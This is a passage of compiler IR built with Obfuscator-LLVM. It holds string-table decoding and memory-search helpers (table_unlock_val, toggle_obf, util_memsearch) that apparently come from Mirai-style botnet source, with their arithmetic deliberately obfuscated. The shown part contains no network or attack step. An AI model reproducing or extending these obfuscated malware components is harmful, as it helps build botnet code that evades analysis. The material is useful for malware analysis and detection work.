  %35 = load i8, i8* %34, align 1
  %36 = sext i8 %35 to i32
  %37 = xor i32 %36, -1
  %38 = and i32 -2077519712, %37
  %39 = xor i32 -2077519712, -1
  %40 = and i32 %36, %39
  %41 = xor i32 222, -1
  %42 = and i32 %41, -2077519712
  %43 = and i32 222, %39
  %44 = or i32 %38, %40
  %45 = or i32 %42, %43
  %46 = xor i32 %44, %45
  %47 = xor i32 %36, 222
  %48 = trunc i32 %46 to i8
  store i8 %48, i8* %34, align 1
  %49 = load i8*, i8** %6, align 8
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = sext i8 %53 to i32
  %55 = xor i32 %54, -1
  %56 = and i32 957153084, %55
  %57 = xor i32 957153084, -1
  %58 = and i32 %54, %57
  %59 = xor i32 222, -1
  %60 = and i32 %59, 957153084
  %61 = and i32 222, %57
  %62 = or i32 %56, %58
  %63 = or i32 %60, %61
  %64 = xor i32 %62, %63
  %65 = xor i32 %54, 222
  %66 = trunc i32 %64 to i8
  store i8 %66, i8* %52, align 1
  %67 = load i8*, i8** %6, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = xor i32 %72, -1
  %74 = and i32 -1300459367, %73
  %75 = xor i32 -1300459367, -1
  %76 = and i32 %72, %75
  %77 = xor i32 251, -1
  %78 = and i32 %77, -1300459367
  %79 = and i32 251, %75
  %80 = or i32 %74, %76
  %81 = or i32 %78, %79
  %82 = xor i32 %80, %81
  %83 = xor i32 %72, 251
  %84 = trunc i32 %82 to i8
  store i8 %84, i8* %70, align 1
  %85 = load i8*, i8** %6, align 8
  %86 = load i32, i32* %5, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = sext i8 %89 to i32
  %91 = xor i32 %90, -1
  %92 = and i32 175, %91
  %93 = xor i32 175, -1
  %94 = and i32 %90, %93
  %95 = or i32 %92, %94
  %96 = xor i32 %90, 175
  %97 = trunc i32 %95 to i8
  store i8 %97, i8* %88, align 1
  br label %98

; <label>:98:                                     ; preds = %30
  %99 = load i32, i32* %5, align 4
  %100 = add i32 %99, -1445533076
  %101 = add i32 %100, 1
  %102 = sub i32 %101, -1445533076
  %103 = add nsw i32 %99, 1
  store i32 %102, i32* %5, align 4
  br label %25

; <label>:104:                                    ; preds = %25
  %105 = load i8*, i8** %6, align 8
  ret i8* %105
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 %12, -1
  %14 = xor i32 255, -1
  %15 = xor i32 -2007493614, -1
  %16 = or i32 %13, %14
  %17 = or i32 -2007493614, %15
  %18 = xor i32 %16, -1
  %19 = and i32 %18, %17
  %20 = and i32 %12, 255
  %21 = trunc i32 %19 to i8
  store i8 %21, i8* %5, align 1
  %22 = load i32, i32* @table_key, align 4
  %23 = lshr i32 %22, 8
  %24 = xor i32 %23, -1
  %25 = xor i32 255, -1
  %26 = xor i32 -1312873616, -1
  %27 = or i32 %24, %25
  %28 = or i32 -1312873616, %26
  %29 = xor i32 %27, -1
  %30 = and i32 %29, %28
  %31 = and i32 %23, 255
  %32 = trunc i32 %30 to i8
  store i8 %32, i8* %6, align 1
  %33 = load i32, i32* @table_key, align 4
  %34 = lshr i32 %33, 16
  %35 = xor i32 %34, -1
  %36 = xor i32 255, -1
  %37 = xor i32 -1168759431, -1
  %38 = or i32 %35, %36
  %39 = or i32 -1168759431, %37
  %40 = xor i32 %38, -1
  %41 = and i32 %40, %39
  %42 = and i32 %34, 255
  %43 = trunc i32 %41 to i8
  store i8 %43, i8* %7, align 1
  %44 = load i32, i32* @table_key, align 4
  %45 = lshr i32 %44, 24
  %46 = xor i32 255, -1
  %47 = xor i32 %45, %46
  %48 = and i32 %47, %45
  %49 = and i32 %45, 255
  %50 = trunc i32 %48 to i8
  store i8 %50, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %132, %1
  %52 = load i32, i32* %3, align 4
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 1
  %55 = load i16, i16* %54, align 8
  %56 = zext i16 %55 to i32
  %57 = icmp slt i32 %52, %56
  br i1 %57, label %58, label %139

; <label>:58:                                     ; preds = %51
  %59 = load i8, i8* %5, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, -1
  %70 = and i32 -164075821, %69
  %71 = xor i32 -164075821, -1
  %72 = and i32 %68, %71
  %73 = xor i32 %60, -1
  %74 = and i32 %73, -164075821
  %75 = and i32 %60, %71
  %76 = or i32 %70, %72
  %77 = or i32 %74, %75
  %78 = xor i32 %76, %77
  %79 = xor i32 %68, %60
  %80 = trunc i32 %78 to i8
  store i8 %80, i8* %66, align 1
  %81 = load i8, i8* %6, align 1
  %82 = zext i8 %81 to i32
  %83 = load %struct.table_value*, %struct.table_value** %4, align 8
  %84 = getelementptr inbounds %struct.table_value, %struct.table_value* %83, i32 0, i32 0
  %85 = load i8*, i8** %84, align 8
  %86 = load i32, i32* %3, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = sext i8 %89 to i32
  %91 = xor i32 %90, -1
  %92 = and i32 %82, %91
  %93 = xor i32 %82, -1
  %94 = and i32 %90, %93
  %95 = or i32 %92, %94
  %96 = xor i32 %90, %82
  %97 = trunc i32 %95 to i8
  store i8 %97, i8* %88, align 1
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = load %struct.table_value*, %struct.table_value** %4, align 8
  %101 = getelementptr inbounds %struct.table_value, %struct.table_value* %100, i32 0, i32 0
  %102 = load i8*, i8** %101, align 8
  %103 = load i32, i32* %3, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %102, i64 %104
  %106 = load i8, i8* %105, align 1
  %107 = sext i8 %106 to i32
  %108 = xor i32 %107, -1
  %109 = and i32 %99, %108
  %110 = xor i32 %99, -1
  %111 = and i32 %107, %110
  %112 = or i32 %109, %111
  %113 = xor i32 %107, %99
  %114 = trunc i32 %112 to i8
  store i8 %114, i8* %105, align 1
  %115 = load i8, i8* %8, align 1
  %116 = zext i8 %115 to i32
  %117 = load %struct.table_value*, %struct.table_value** %4, align 8
  %118 = getelementptr inbounds %struct.table_value, %struct.table_value* %117, i32 0, i32 0
  %119 = load i8*, i8** %118, align 8
  %120 = load i32, i32* %3, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  %123 = load i8, i8* %122, align 1
  %124 = sext i8 %123 to i32
  %125 = xor i32 %124, -1
  %126 = and i32 %116, %125
  %127 = xor i32 %116, -1
  %128 = and i32 %124, %127
  %129 = or i32 %126, %128
  %130 = xor i32 %124, %116
  %131 = trunc i32 %129 to i8
  store i8 %131, i8* %122, align 1
  br label %132

; <label>:132:                                    ; preds = %58
  %133 = load i32, i32* %3, align 4
  %134 = sub i32 0, %133
  %135 = sub i32 0, 1
  %136 = add i32 %134, %135
  %137 = sub i32 0, %136
  %138 = add nsw i32 %133, 1
  store i32 %137, i32* %3, align 4
  br label %51

; <label>:139:                                    ; preds = %51
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %57

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %51, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %56

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %49

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add i32 %36, 1502773631
  %38 = add i32 %37, 1
  %39 = sub i32 %38, 1502773631
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %39, %41
  br i1 %42, label %43, label %48

; <label>:43:                                     ; preds = %35
  %44 = load i32, i32* %10, align 4
  %45 = sub i32 0, 1
  %46 = sub i32 %44, %45
  %47 = add nsw i32 %44, 1
  store i32 %46, i32* %5, align 4
  br label %57

; <label>:48:                                     ; preds = %35
  br label %50

; <label>:49:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %48
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = load i32, i32* %10, align 4
  %53 = sub i32 0, 1
  %54 = sub i32 %52, %53
  %55 = add nsw i32 %52, 1
  store i32 %54, i32* %10, align 4
  br label %17

; <label>:56:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %57

; <label>:57:                                     ; preds = %56, %43, %15
  %58 = load i32, i32* %5, align 4
  ret i32 %58
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146816818}
!2 = !{i32 -2146816409}
